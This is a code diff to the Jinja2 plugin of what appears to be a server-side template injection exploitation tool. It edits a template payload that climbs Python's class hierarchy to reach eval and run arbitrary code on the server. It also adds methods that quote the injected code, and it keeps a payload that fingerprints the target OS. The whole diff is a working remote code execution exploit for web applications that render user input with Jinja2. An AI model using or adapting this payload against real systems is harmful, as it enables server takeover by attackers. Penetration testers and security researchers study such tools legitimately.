@@ -1,4 +1,4 @@
-from utils.strings import quote, chunkit, md5
+from utils.strings import quote
 from core.plugin import Plugin
 from core import closures
 from utils.loggers import log
@@ -28,7 +28,7 @@ class Jinja2(Plugin):
         },
         'evaluate' : {
             'call': 'inject',
-            'evaluate': """{%% set d = \"\"\"%(code)s\"\"\" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
+            'evaluate': """{%% set d = "%(code)s" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
     {%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
     {%% if 'eval' in b.keys() %%}
     {{ b['eval'](d) }}
@@ -81,3 +81,12 @@ class Jinja2(Plugin):
         payload = """"-".join([__import__("os").name, __import__("sys").platform])"""
         self.set('os', self.evaluate(payload))
         self.set('eval', 'python')
+
+    def evaluate(self, code):
+        # Quote code before submitting it
+        return super(Jinja2, self).evaluate(quote(code))
+
+
+    def execute(self, code):
+        # Quote code before submitting it
+        return super(Jinja2, self).execute(quote(code))
